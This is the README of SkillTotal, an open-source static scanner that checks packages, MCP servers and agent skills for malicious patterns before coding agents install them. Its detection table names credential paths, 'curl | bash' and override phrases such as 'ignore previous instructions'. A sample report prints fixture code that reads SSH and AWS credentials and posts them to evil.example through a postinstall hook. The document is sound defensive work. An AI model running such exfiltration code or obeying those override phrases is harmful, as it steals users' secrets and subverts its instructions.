<!-- mcp-name: ai.skilltotal/skilltotal -->

<p align="center">
  <a href="https://www.skilltotal.ai">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/pezhik/skilltotal/main/docs/assets/logo-dark.svg">
      <img alt="SkillTotal" src="https://raw.githubusercontent.com/pezhik/skilltotal/main/docs/assets/logo-light.svg" height="64">
    </picture>
  </a>
</p>

<h3 align="center">Check packages before your coding agent installs them.</h3>

<p align="center">
  A static security scanner for npm and PyPI packages, MCP servers, agent skills and repositories.<br>
  Runs on your machine · never runs the code it scans · no LLM · every finding cites a file and line
</p>

<p align="center">
  <a href="https://pypi.org/project/skilltotal/"><img alt="PyPI" src="https://img.shields.io/pypi/v/skilltotal"></a>
  <a href="https://github.com/pezhik/skilltotal/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/pezhik/skilltotal/actions/workflows/ci.yml/badge.svg"></a>
  <a href="https://scorecard.dev/viewer/?uri=github.com/pezhik/skilltotal"><img alt="OpenSSF Scorecard" src="https://api.scorecard.dev/projects/github.com/pezhik/skilltotal/badge"></a>
  <a href="https://github.com/marketplace/actions/skilltotal-ai-component-security-scan"><img alt="GitHub Action" src="https://img.shields.io/badge/GitHub_Action-Marketplace-2088FF?logo=githubactions&amp;logoColor=white"></a>
  <a href="https://github.com/pezhik/skilltotal/blob/main/pyproject.toml"><img alt="Runtime dependencies: 0" src="https://img.shields.io/badge/runtime_deps-0-brightgreen"></a>
  <a href="https://github.com/pezhik/skilltotal/blob/main/LICENSE"><img alt="License" src="https://img.shields.io/pypi/l/skilltotal"></a>
</p>

<p align="center">
  <a href="https://github.com/pezhik/skilltotal#quick-start">Quick start</a> ·
  <a href="https://github.com/pezhik/skilltotal/blob/main/docs/plugin.md">Claude Code plugin</a> ·
  <a href="https://github.com/pezhik/skilltotal/blob/main/docs/ci.md">GitHub Action</a> ·
  <a href="https://github.com/pezhik/skilltotal/blob/main/docs/cli.md">CLI</a> ·
  <a href="https://github.com/pezhik/skilltotal/blob/main/docs/detection.md">What it detects</a> ·
  <a href="https://www.skilltotal.ai">Try it online</a>
</p>

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/pezhik/skilltotal/main/docs/assets/demo-hook-block-dark.svg">
    <img alt="A coding agent runs npm install on a test package; the SkillTotal plugin denies it and names the finding and its file and line" src="https://raw.githubusercontent.com/pezhik/skilltotal/main/docs/assets/demo-hook-block-light.svg" width="600">
  </picture>
</p>
<p align="center"><sub>The plugin's real answer for a sanitized test package. No real package is shown.</sub></p>

## Quick start

```bash
pipx install skilltotal
skilltotal scan npm:express     # or pypi:name, a git URL, a folder, an archive
```

**Check what your coding agent installs.** Inside Claude Code:

```
/plugin marketplace add pezhik/skilltotal
/plugin install skilltotal@skilltotal
/reload-plugins
```

**Gate pull requests.** Add one step to a workflow
([full example with permissions](https://github.com/pezhik/skilltotal/blob/main/docs/ci.md)):

```yaml
      - uses: pezhik/skilltotal@v0.83.0
        with: { source: ., fail-on: high }
```

To try it without installing anything, [www.skilltotal.ai](https://www.skilltotal.ai) runs the same engine.

## What it catches

It scans npm and PyPI packages, MCP servers, agent skills and plugins, git repositories (or one
folder of them), local folders, archives and single files, and looks for:

| Category | Examples |
|----------|----------|
| Shell execution | `subprocess.*`, `os.system`, `child_process.exec`, `curl … \| bash` handed to a shell call |
| Filesystem access | `open`, `read_text`/`write_text`, `fs.readFile`/`writeFile` |
| Sensitive paths | `~/.ssh`, `~/.aws`, `.env`, `id_rsa`, `credentials`, `secrets` |
| Network egress | `requests`, `urllib`, `aiohttp`, `fetch`, `axios` |
| Install-time execution | npm `preinstall`/`postinstall`/`prepare`, `setup.py` hooks, a lifecycle script that downloads or decodes code and runs it |
| Dynamic code execution | `eval`, `exec`, `compile`, `new Function`, `vm.runInNewContext` |
| Obfuscation | decode-and-execute chains, base64 blobs, hex escaping, minification |
| MCP risks | manifests, dangerous tools (shell/fs/network/credential), server commands |
| Prompt surface | "ignore previous instructions", "reveal system prompt", exfiltration phrasing |

It also flags hidden Unicode in agent-facing text, embedded secrets, auto-approved MCP tools and
data flows such as a credential read followed by network egress. `skilltotal rules list` prints
every rule; coverage by component type and accuracy notes are in [docs/detection.md](https://github.com/pezhik/skilltotal/blob/main/docs/detection.md).

<details>
<summary>Example report (a sanitized test package from this repository)</summary>

```text
$ skilltotal scan tests/fixtures/malicious_npm_pkg
SkillTotal Security Report
==========================
Component : evil-npm-pkg 0.0.1 (npm_package)
Source    : tests/fixtures/malicious_npm_pkg
Verdict   : HIGH - High risk - review before installing
Risk      : HIGH  (score 70/100)

Findings (3 risk, 4 capability, not scored):
  [CRITICAL] ST-COMBO-EXFIL  Sensitive-data access combined with network egress
    Evidence:
      - index.js:7
        const key = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
      - steal.js:3
        const data = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
      - index.js:13
        fetch('http://evil.example/collect', { method: 'POST', body: key });
      ... and 1 more (all of them in --json)

  [HIGH] ST-INSTALL-DROPPER  Install-time hook paired with a dropper payload
    Evidence:
      - package.json:6
        "postinstall": "node steal.js"
  ...
```

Shortened. The full report also prints descriptions, recommendations, capabilities and review items.

</details>

## Why SkillTotal

- The [Claude Code plugin](https://github.com/pezhik/skilltotal#claude-code-plugin) checks each `npx`,
  `npm install`, `pip install` or `claude mcp add` command before the agent runs it.
- It runs on your machine without an account, API token, upload or telemetry, and never runs the
  code it reads ([Network access](https://github.com/pezhik/skilltotal#network-access)).
- Detection is regex and AST matching with no LLM, so the same input on the same Python version
  gives the same findings and score. Every finding cites a file and line, and recall and precision
  are [published](https://github.com/pezhik/skilltotal#measured-not-asserted).
- Zero runtime dependencies (Python standard library only) make it easy to audit, vendor or run air-gapped.
- Reports carry a behavioral trait fingerprint mapped to the Cloud Security Alliance (CSA) agentic
  threat model, MAESTRO layers and MITRE ATLAS tactics; findings carry OWASP Agentic Skills Top 10 ids.
- It is open source (Apache-2.0), and the full static report is free, forever.

## How it works

<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/pezhik/skilltotal/main/docs/assets/how-it-works-dark.svg">
    <img alt="Pipeline: source, fetch without running, index, scanners, correlate and score, outputs" src="https://raw.githubusercontent.com/pezhik/skilltotal/main/docs/assets/how-it-works-light.svg" width="820">
  </picture>
</p>

SkillTotal fetches the component (a shallow git clone or the package archive), reads every file
once and runs its scanners over them. It correlates the findings (a credential read plus network
egress becomes an exfiltration path) and scores the result from 0 to 100. It looks only at the
component's own files, never at the user, company, environment, deployment or runtime context.
Every confirmed finding carries evidence (file, line range, code snippet); a signal that cannot be
tied to evidence goes to `needs_review`, which never affects the score. A capability such as shell
or network access is reported but scores zero. Details in [docs/architecture.md](https://github.com/pezhik/skilltotal/blob/main/docs/architecture.md) and [docs/scoring.md](https://github.com/pezhik/skilltotal/blob/main/docs/scoring.md).

## Claude Code plugin

Before an install command runs, the plugin scans each package it names, locally and with the same
engine as the CLI. It reads npm, pnpm, yarn, bun, npx, pip, uv, uvx, pipx, poetry and similar
installs, `claude mcp add` (and the Codex and Gemini equivalents) and `npx skills add`, including
when they are wrapped in `sudo`, `bash -c`, `$(...)` or PowerShell. Install the CLI first
(`skilltotal --version` must work where you start Claude Code), then run the three commands from
[Quick start](https://github.com/pezhik/skilltotal#quick-start).

| The scan finds | What happens to the install |
|---|---|
| Malicious indicators | Denied. The agent is told the finding and its file:line |
| High or critical risk, a look-alike package name, or anything it could not check (a custom registry, a name built at run time, a command hidden behind a decoder, a check that failed or ran out of time) | Claude Code asks you |
| Nothing of that kind | It installs. The agent gets a one-line note with the version checked and its score |
| Anything it would ask about, in CI | Denied: CI is fail-closed (see below) |

Each install command gets a console line saying what was checked, or what was not and why. In CI
(`CI`, `GITLAB_CI`, `JENKINS_URL` and similar, or `SKILLTOTAL_STRICT=1`) nobody is there to answer,
so anything it would ask about is denied. Installs it could not check are denied too, unless
`SKILLTOTAL_ALLOW_UNCHECKED` lists their kind.

It does not check the dependencies of the named package, installs that name no package (`npm ci`,
`pip install -r`, `uv sync`; the console says so), scripts on disk, shell-profile aliases or
functions, downloaded scripts (`curl ... | bash`, reported as not checked), repositories fetched
with `git clone`, or code already running on your account (it can rewrite the verdict cache or the
CLI). The plugin is a static check, not a sandbox: run the agent in a container for code you don't
trust. It also adds a `/skilltotal:scan <target>` command and registers the SkillTotal MCP server.
Recognized commands, settings, cache, timing, [team rollout](https://github.com/pezhik/skilltotal/blob/main/docs/plugin.md#rolling-out-to-a-team)
and [troubleshooting](https://github.com/pezhik/skilltotal/blob/main/docs/plugin.md#troubleshooting) are in [docs/plugin.md](https://github.com/pezhik/skilltotal/blob/main/docs/plugin.md).

## CI / GitHub Action

Run SkillTotal in CI and see the findings in your repository's **Security → Code scanning** tab.

```yaml
# .github/workflows/skilltotal.yml
name: SkillTotal
on: [push, pull_request]
permissions:
  contents: read
  security-events: write   # required to upload SARIF to Code Scanning
  actions: read            # required for the SARIF upload in a private repository
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: pezhik/skilltotal@v0.83.0
        with:
          source: .             # a path, a git URL, or an npm:/pypi:<name> spec
          fail-on: high         # fail on a high/critical risk finding (or 'none')
```

A malicious indicator fails the job at any severity; a capability on its own, such as a shell call
or network access, never does. The log names the gate that tripped and the finding behind it.
Findings are uploaded as SARIF. A private repository has Code Scanning only with GitHub Advanced
Security; without it, set `upload-sarif: 'false'`. `comment-on-pr: 'true'` (with
`pull-requests: write`) keeps one summary comment up to date. The repository's `.skilltotal.toml`
is applied, so put it under CODEOWNERS ([Configuration](https://github.com/pezhik/skilltotal#configuration)).
[docs/ci.md](https://github.com/pezhik/skilltotal/blob/main/docs/ci.md) covers every input and
output, scheduled re-checks of a third-party package, pre-commit, GitLab CI, Jenkins and rolling
out on an existing repository. Anywhere else Python 3.10+ runs, install a pinned release and gate
on the exit code (0 passed, 2 a gate tripped, 1 the scan could not run):

```bash
pip install skilltotal==0.83.0      # in a virtual environment outside the checkout
skilltotal scan . --fail-on high
```

## CLI

```bash
skilltotal scan ./path/to/component           # a folder, archive, file, git URL, npm:name or pypi:name
skilltotal scan ./component --json            # JSON to stdout
skilltotal scan ./component --sarif --output report.sarif
skilltotal scan ./component --fail-on high    # exit 2 on a high/critical risk finding
skilltotal scan ./component --write-baseline .skilltotal-baseline.json
skilltotal scan ./component --baseline .skilltotal-baseline.json --fail-on-high
skilltotal diff npm:some-lib@1.2.3 npm:some-lib@1.2.4 --fail-on-new high
skilltotal guard npm:some-mcp-server          # exit 2 if it should not be installed
skilltotal guard --installed                  # check the MCP servers, plugins and skills your agents use
skilltotal inventory --sbom                   # AI-BOM: CycloneDX 1.6 JSON of your agent stack
skilltotal rules list
```

`scan` on its own exits 0 whatever it finds, even for a malicious verdict. In a script, use
`skilltotal guard` or a gate (`--fail-on`) and check the exit code. Every flag, exit code and gate
is described in the [CLI reference](https://github.com/pezhik/skilltotal/blob/main/docs/cli.md).

## MCP server

`skilltotal mcp` runs the engine as a stdio MCP server so your agent can check a component before
installing it. The Claude Code plugin already registers it. In Claude Code without the plugin:

```bash
claude mcp add skilltotal -- skilltotal mcp
```

For Claude Desktop, Cursor, Windsurf or any client that reads `mcpServers`:

```json
{ "mcpServers": { "skilltotal": { "command": "skilltotal", "args": ["mcp"] } } }
```

It has three read-only tools: `scan_component` (a local path, git URL, `npm:` or `pypi:` source),
`diff_components` (what changed between two versions) and `list_rules`. VS Code, the `uvx`/`npx`
forms and the path rules are in [docs/mcp-server.md](https://github.com/pezhik/skilltotal/blob/main/docs/mcp-server.md).

## Install

Requires **Python 3.10+**, with zero runtime dependencies. `git` is needed only for scanning
remote URLs and for `scan --staged`. Scanning inside a directory you don't trust and other install
details are in [docs/cli.md](https://github.com/pezhik/skilltotal/blob/main/docs/cli.md#install).

```bash
pipx install skilltotal      # recommended for the CLI; then `pipx ensurepath` if it is not found
pip install skilltotal       # into a virtual environment, or to use it as a library
```

With npx (it needs uv, pipx, or Python 3.11+ with `skilltotal` installed), name the release with
`--package` so npx does not run a `skilltotal` from the scanned repository's `node_modules/.bin`:

```bash
npx -y --package=skilltotal@0.83.0 -- skilltotal scan https://github.com/owner/repo
```

## Measured, not asserted

- **[Detection efficacy](https://github.com/pezhik/skilltotal/blob/main/docs/efficacy-report.md)**:
  recall and precision on a labeled corpus we built and publish (144 malicious and
  106 benign samples), regenerated every release and enforced by CI as a floor. A perfect score on
  our own corpus guards against regressions; it is not a claim about every attack in the wild.
  Each rule behind the survey's OWASP class counts also has labeled samples of its own, listed in
  the report's rule coverage table.
- **[The MCP registry, scanned](https://github.com/pezhik/skilltotal/blob/main/docs/mcp-registry-survey.md)**
  (September 2026, engine 0.49.0, rulesets 56 to 59; later rule changes are not reflected): 15,341
  of the 17,535 distinct components in the official registry (87.5%). Of those scanned, 88.2%
  expose tools to an agent, 64.8% can reach the network and 21.1% can execute shell commands.
  Still, all but 116 of them score low risk, because a capability on its own scores zero. Before
  this run we read every malicious-indicator hit from an earlier run by hand and fixed the false positives.
  [Aggregates (JSON)](https://github.com/pezhik/skilltotal/blob/main/docs/mcp-registry-survey.json) ·
  [the harness](https://github.com/pezhik/skilltotal/blob/main/tests/manual_eval/survey_registry.py).

## Limitations

- **Files over 2 MiB are not read.** Minified JavaScript/TypeScript bundles are listed but not
  analyzed, except the scripts npm runs at install. A low verdict then reads "Partially analyzed".
- **Dependencies are not scanned.** `node_modules/`, `vendor/` and virtual environments are skipped.
- **Code fetched or generated at run time is not analyzed**, nor are binaries and compiled artifacts.
- **Languages.** Shell execution, network access, file access and dynamic code are analyzed in
  Python and JavaScript/TypeScript. Shell, PowerShell and batch scripts are checked for
  download-and-run, decode-and-run and evasion idioms. Other languages get only the secret,
  sensitive-path and hidden-Unicode checks.
- **The default gate does not count unread code**, and unread code never passes in silence: the
  log names it (`Not everything was analyzed: ...`), the verdict reads "Partially analyzed", and
  `--fail-on-unanalyzed` fails on it. That covers files over 2 MiB, minified bundles, code in
  languages not analyzed for behavior, and compiled code shipped without its source (a `.pyc`,
  `.pyo` or `.class` with no `.py` or `.java` of the same name beside it).
- **Detection is at the call/import level.** A capability shows the code is there, not that it is
  misused. SkillTotal does not replace a sandbox, a penetration test or a manual code review.

For how the four bypasses published in June 2026 fare against this engine, see [What we catch](https://www.skilltotal.ai/what-we-catch).
The full list is in [docs/detection.md](https://github.com/pezhik/skilltotal/blob/main/docs/detection.md#limitations).

## Configuration

Commit a `.skilltotal.toml` instead of repeating flags: gate levels, excludes, ignored rules, a
baseline file and per-rule `block` / `warn` / `ignore` policy. To accept a single finding, add an
inline `skilltotal:ignore[ST-ID]` comment. Limits and registry mirrors are set with `SKILLTOTAL_*`
environment variables. In CI the scanned repository's own config and markers apply, so put
`.skilltotal.toml` and the baseline under CODEOWNERS with branch protection ([docs/configuration.md](https://github.com/pezhik/skilltotal/blob/main/docs/configuration.md)).

## Network access

A scan of a local folder, archive or file makes no network request. SkillTotal goes online only for:

- **git URLs:** `git clone --depth 1`; for github.com, GitHub REST API calls (`api.github.com`)
  first, to check the size of what would be cloned
- **`npm:` / `pypi:` sources:** package metadata and archive from `registry.npmjs.org` or PyPI
  (`pypi.org` and its file host), or from your mirror (`SKILLTOTAL_NPM_REGISTRY`, `SKILLTOTAL_PYPI_INDEX`)
- **`--provenance`:** the package's registry metadata
- **`inventory`, `guard --installed`, the Claude Code plugin and the MCP server:** the same registries and git hosts, for the packages they check

It sends no telemetry, needs no account and makes no LLM call.

## Open source vs SkillTotal Cloud

This engine (the analysis, all detection rules and the CLI) is open source and complete on its
own, free to run locally or in CI. Paid features are planned for SkillTotal Cloud as server-side
services on top of it; their code is not part of this repository ([docs/open-core.md](https://github.com/pezhik/skilltotal/blob/main/docs/open-core.md)).

## Documentation

| Section | Now in |
|---|---|
| <a id="usage"></a>Usage, <a id="exit-codes"></a>exit codes, <a id="status-badge"></a>status badge | [docs/cli.md](https://github.com/pezhik/skilltotal/blob/main/docs/cli.md) |
| <a id="project-config"></a>Project config, <a id="inline-suppression"></a>inline suppression, <a id="environment-variables"></a>environment variables, <a id="scanning-through-a-registry-mirror"></a>registry mirrors | [docs/configuration.md](https://github.com/pezhik/skilltotal/blob/main/docs/configuration.md) |
| Action inputs and outputs, <a id="use-as-a-pre-commit-hook"></a>pre-commit, <a id="other-ci-systems"></a>other CI systems, <a id="rolling-out-on-an-existing-repository"></a>rolling out | [docs/ci.md](https://github.com/pezhik/skilltotal/blob/main/docs/ci.md) |
| MCP server clients and path rules | [docs/mcp-server.md](https://github.com/pezhik/skilltotal/blob/main/docs/mcp-server.md) |
| <a id="what-it-detects"></a>What it detects, <a id="coverage-by-component-type"></a>coverage by component type, <a id="typical-findings"></a>typical findings, <a id="verdict"></a>verdict, <a id="out-of-scope"></a>out of scope, <a id="accuracy-notes"></a>accuracy notes | [docs/detection.md](https://github.com/pezhik/skilltotal/blob/main/docs/detection.md) |
| Malware archetypes and the rules that catch them | [docs/detection-coverage.md](https://github.com/pezhik/skilltotal/blob/main/docs/detection-coverage.md) |
| <a id="output"></a>Report output, traits, OWASP mapping | [docs/report-schema.md](https://github.com/pezhik/skilltotal/blob/main/docs/report-schema.md) |
| Claude Code plugin reference | [docs/plugin.md](https://github.com/pezhik/skilltotal/blob/main/docs/plugin.md) |
| <a id="architecture"></a>Architecture | [docs/architecture.md](https://github.com/pezhik/skilltotal/blob/main/docs/architecture.md) |

## Contributing, security and license

<a id="development"></a>Development setup: `pip install -e ".[dev]"`, then `pytest`. Detection rules are
added corpus-first ([docs/contributing-rules.md](https://github.com/pezhik/skilltotal/blob/main/docs/contributing-rules.md)).
[Report false positives](https://github.com/pezhik/skilltotal/issues) as issues; they are fixed in the open.
Security issues: [SECURITY.md](https://github.com/pezhik/skilltotal/blob/main/SECURITY.md).

<a id="license"></a>[Apache-2.0](https://github.com/pezhik/skilltotal/blob/main/LICENSE), see also [NOTICE](https://github.com/pezhik/skilltotal/blob/main/NOTICE).
